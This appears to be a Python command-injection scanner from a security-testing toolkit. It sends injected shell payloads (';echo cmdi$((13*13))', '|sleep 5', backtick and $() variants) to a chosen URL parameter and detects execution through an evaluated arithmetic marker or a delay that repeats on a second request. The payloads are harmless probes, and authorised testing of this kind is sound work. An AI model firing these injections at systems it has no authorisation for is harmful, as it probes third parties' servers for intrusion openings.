#!/usr/bin/env python
"""cmd_inject.py — OS command-injection tester (Commix-style).

Two LEAD signals, each designed so plain input REFLECTION cannot satisfy it:
  * echo/arith: inject `echo cmdi$((13*13))`; the shell prints `cmdi169` only if
    it EVALUATED the arithmetic. The literal payload contains `13*13`, never
    `cmdi169`, so an endpoint that merely echoes the input back does not match.
  * timing: inject `sleep 5`; confirm only if the response is delayed past the
    MEASURED baseline AND a re-fire reproduces the delay (kills LB/WAF/cache blips).

Emits a LEAD, never "confirmed" (reflection != execution; the verifier/browser
confirms). See .claude/rules/{evidence-standard,pitfalls,tradecraft-doctrine}.md.

Usage: python cmd_inject.py <url> --param name [--method GET|POST]
       [--data 'k=__INJECT__'] [--concurrency 4]
"""
import argparse, concurrent.futures, json, os, sys, urllib.parse
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _http import get, post

A, B = 13, 13
COMPUTED = f"cmdi{A * B}"   # "cmdi169" — present ONLY if the shell evaluated $((A*B))
SLEEP = 5
MARGIN = 0.6 * SLEEP       # a delay must exceed baseline + this to count

# label, payload. Echo payloads carry the *unevaluated* arithmetic (so a reflector
# cannot produce COMPUTED); timing payloads sleep.
PAYLOADS = [
    ("semi+echo",      f";echo cmdi$(({A}*{B}))"),
    ("pipe+echo",      f"|echo cmdi$(({A}*{B}))"),
    ("backtick+echo",  f"`echo cmdi$(({A}*{B}))`"),
    ("dollar+echo",    f"$(echo cmdi$(({A}*{B})))"),
    ("semi+sleep",     f";sleep {SLEEP}"),
    ("pipe+sleep",     f"|sleep {SLEEP}"),
    ("and+sleep",      f"&&sleep {SLEEP}"),
    ("newline+sleep",  f"\nsleep {SLEEP}"),
]


def fire(url, param, payload, method, data_tmpl):
    if method == "POST":
        body = data_tmpl.replace("__INJECT__", urllib.parse.quote(payload))
        return post(url, data=body.encode(),
                    headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=30)
    sep = "&" if "?" in url else "?"
    return get(f"{url}{sep}{param}={urllib.parse.quote(payload)}", timeout=30)


def test_payload(url, param, label, payload, method, data_tmpl, baseline_t):
    is_sleep = "sleep" in payload
    r = fire(url, param, payload, method, data_tmpl)
    executed = (not r.error) and (COMPUTED in r.text)              # echo arithmetic evaluated
    delayed = (not r.error) and (r.elapsed > baseline_t + MARGIN)  # timing past baseline
    out = {"label": label, "payload": payload, "time_s": round(r.elapsed, 2),
           "baseline_s": round(baseline_t, 2), "executed_marker": executed,
           "delayed": delayed, "status": (None if r.error else r.status)}
    if r.error:
        out["error"] = r.error
    # timing confirmation: re-fire once; the delay must REPRODUCE
    if is_sleep and delayed:
        r2 = fire(url, param, payload, method, data_tmpl)
        out["delayed_refire"] = (not r2.error) and (r2.elapsed > baseline_t + MARGIN)
        out["time_s_refire"] = round(r2.elapsed, 2)
    return out


def is_lead(r):
    return bool(r.get("executed_marker") or (r.get("delayed") and r.get("delayed_refire")))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url")
    ap.add_argument("--param", required=True)
    ap.add_argument("--method", choices=["GET", "POST"], default="GET")
    ap.add_argument("--data", default="", help="POST body template (use __INJECT__ for the value)")
    ap.add_argument("--concurrency", type=int, default=4)
    args = ap.parse_args()
    data_tmpl = args.data or f"{args.param}=__INJECT__"

    # baseline latency (benign request)
    if args.method == "GET":
        bench = get(args.url, timeout=15)
    else:
        bench = post(args.url, data=data_tmpl.replace("__INJECT__", "redan_benign").encode(),
                     headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
    baseline_t = 1.0 if bench.error else bench.elapsed

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futs = [pool.submit(test_payload, args.url, args.param, lbl, pl, args.method, data_tmpl, baseline_t)
                for lbl, pl in PAYLOADS]
        for f in concurrent.futures.as_completed(futs):
            results.append(f.result())
    results.sort(key=lambda x: x.get("time_s", 0), reverse=True)
    leads = [r for r in results if is_lead(r)]
    print(json.dumps({
        "tool": "cmd_inject", "target": args.url, "param": args.param, "ok": True, "baseline_s": round(baseline_t, 2),
        "payloads_tested": len(results), "signals": len(leads),
        "disposition": "lead" if leads else "none",
        "verdict": ("COMMAND-INJECTION LEAD — shell evaluated injected arithmetic or a reproduced "
                    "timing delay (verify with the verifier/browser)") if leads
                   else "no command-injection signal",
        "results": results, "lead_details": leads,
        "note": "echo-marker 'cmdi169' = the shell evaluated $((13*13)) (reflection alone cannot "
                "produce it); a sleep delay past baseline that REPRODUCES = timing signal. LEAD only."},
        indent=2))


if __name__ == "__main__":
    main()
